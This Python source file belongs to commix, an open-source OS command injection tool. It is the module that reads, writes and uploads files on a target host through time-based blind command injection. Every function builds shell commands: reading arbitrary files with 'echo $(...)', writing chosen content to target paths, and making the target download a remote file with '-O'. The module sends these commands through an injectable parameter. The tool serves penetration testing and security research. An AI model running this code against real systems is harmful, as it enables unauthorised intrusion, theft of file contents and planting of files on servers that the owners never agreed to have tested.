#!/usr/bin/env python
# encoding: UTF-8

"""
 This file is part of commix (@commixproject) tool.
 Copyright (c) 2015 Anastasios Stasinopoulos (@ancst).
 https://github.com/stasinopoulos/commix

 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation, either version 3 of the License, or
 (at your option) any later version.
 
 For more see the file 'readme/COPYING' for copying permission.
"""

import os
import sys
import urllib2

from src.utils import menu
from src.utils import settings

from src.thirdparty.colorama import Fore, Back, Style, init
from src.core.injections.blind_based.techniques.time_based import tb_injector

"""
 The "time-based" injection technique on Blind OS Command Injection.
"""
  
"""
Read a file from the target host.
"""
def file_read(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell, filename):

  file_to_read = menu.options.file_read
  # Execute command
  cmd = "echo $(" + settings.FILE_READ + file_to_read + ")"
  check_how_long, output = tb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell, filename)
  shell = output 
  try:
    shell = "".join(str(p) for p in shell)
  except TypeError:
    pass
  if shell:
    # if menu.options.verbose:
    #   print ""
    sys.stdout.write(Style.BRIGHT + "\n\n (!) The contents of file '" + Style.UNDERLINE + file_to_read + Style.RESET_ALL + "' : ")
    sys.stdout.flush()
    print shell
    output_file = open(filename, "a")
    output_file.write("    (!) The contents of file '" + file_to_read + "' : " + shell + ".\n")
    output_file.close()
  else:
   sys.stdout.write(Fore.YELLOW + "(^) Warning: It seems that you don't have permissions to read the '"+ file_to_read + "' file." + Style.RESET_ALL + "\n")
   sys.stdout.flush()
   

"""
Write to a file on the target host.
"""
def file_write(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell, filename):
  file_to_write = menu.options.file_write
  if not os.path.exists(file_to_write):
    sys.stdout.write(Fore.YELLOW + "(^) Warning: It seems that the '"+ file_to_write + "' file, does not exists." + Style.RESET_ALL + "\n")
    sys.stdout.flush()
    sys.exit(0)
    
  if os.path.isfile(file_to_write):
    with open(file_to_write, 'r') as content_file:
      content = [line.replace("\n", " ") for line in content_file]
    content = "".join(str(p) for p in content).replace("'", "\"")
    # Remove whitespace at the end.
    content = content.rstrip()
  else:
    sys.stdout.write(Fore.YELLOW + "(^) Warning: It seems that '"+ file_to_write + "' is not a file." + Style.RESET_ALL + "\n")
    sys.stdout.flush()
    sys.exit(0)

  # Check the file-destination
  if os.path.split(menu.options.file_dest)[1] == "" :
    dest_to_write = os.path.split(menu.options.file_dest)[0] + "/" + os.path.split(menu.options.file_write)[1]
  elif os.path.split(menu.options.file_dest)[0] == "/":
    dest_to_write = "/" + os.path.split(menu.options.file_dest)[1] + "/" + os.path.split(menu.options.file_write)[1]
  else:
    dest_to_write = menu.options.file_dest
    
  # Execute command
  cmd = settings.FILE_WRITE + "'" + content + "'" + " > " + "'" + dest_to_write + "'" + separator + settings.FILE_READ + dest_to_write
  check_how_long, output = tb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell, filename)
  shell = output 
  try:
    shell = "".join(str(p) for p in shell)
  except TypeError:
    pass
  
  # Check if file exists!
  print ""
  cmd = "echo $(ls " + dest_to_write + ")"
  check_how_long, output = tb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell, filename)
  shell = output 
  try:
    shell = "".join(str(p) for p in shell)
  except TypeError:
    pass
  if shell:
    if menu.options.verbose:
      print ""
    sys.stdout.write(Style.BRIGHT + "\n\n  (!) The " + Style.UNDERLINE + shell + Style.RESET_ALL + Style.BRIGHT +" file was created successfully!" + Style.RESET_ALL + "\n\n")
    sys.stdout.flush()
  else:
   sys.stdout.write(Fore.YELLOW + "(^) Warning: It seems that you don't have permissions to write the '"+ dest_to_write + "' file." + Style.RESET_ALL + "\n\n")
   sys.stdout.flush()
   
   
"""
Upload a file on the target host.
"""
def file_upload(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell, filename):
  file_to_upload = menu.options.file_upload

  # check if remote file exists.
  try:
    urllib2.urlopen(file_to_upload)
  except urllib2.HTTPError, err:
    sys.stdout.write(Fore.YELLOW + "(^) Warning: It seems that the '"+ file_to_upload + "' file, does not exists. ("+str(err)+")" + Style.RESET_ALL + "\n\n")
    sys.stdout.flush()
    sys.exit(0)
    
  # Check the file-destination
  if os.path.split(menu.options.file_dest)[1] == "" :
    dest_to_upload = os.path.split(menu.options.file_dest)[0] + "/" + os.path.split(menu.options.file_upload)[1]
  elif os.path.split(menu.options.file_dest)[0] == "/":
    dest_to_upload = "/" + os.path.split(menu.options.file_dest)[1] + "/" + os.path.split(menu.options.file_upload)[1]
  else:
    dest_to_upload = menu.options.file_dest
    
  # Execute command
  cmd = settings.FILE_UPLOAD + file_to_upload + " -O " + dest_to_upload 
  check_how_long, output = tb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell, filename)
  shell = output 
  try:
    shell = "".join(str(p) for p in shell)
  except TypeError:
    pass
  
  # Check if file exists!
  print ""
  cmd = "echo $(ls " + dest_to_upload + ")"
  check_how_long, output = tb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell, filename)
  shell = output 
  try:
    shell = "".join(str(p) for p in shell)
  except TypeError:
    pass
  
  if shell:
    if menu.options.verbose:
      print ""
    sys.stdout.write(Style.BRIGHT + "\n\n  (!) The " + Style.UNDERLINE + shell + Style.RESET_ALL + Style.BRIGHT +" file was uploaded successfully!" + Style.RESET_ALL + "\n\n")
    sys.stdout.flush()
  else:
   sys.stdout.write(Fore.YELLOW + "(^) Warning: It seems that you don't have permissions to write the '"+ dest_to_upload + "' file." + Style.RESET_ALL + "\n\n")
   sys.stdout.flush()


"""
Check the defined options
"""
def do_check(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell, filename):
  
  if menu.options.file_write:
    file_write(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell, filename)
    settings.FILE_ACCESS_DONE = True

  if menu.options.file_upload:
    file_upload(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell, filename)
    settings.FILE_ACCESS_DONE = True

  if menu.options.file_read:
    file_read(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell, filename)
    settings.FILE_ACCESS_DONE = True

  if settings.FILE_ACCESS_DONE :
    print ""

# eof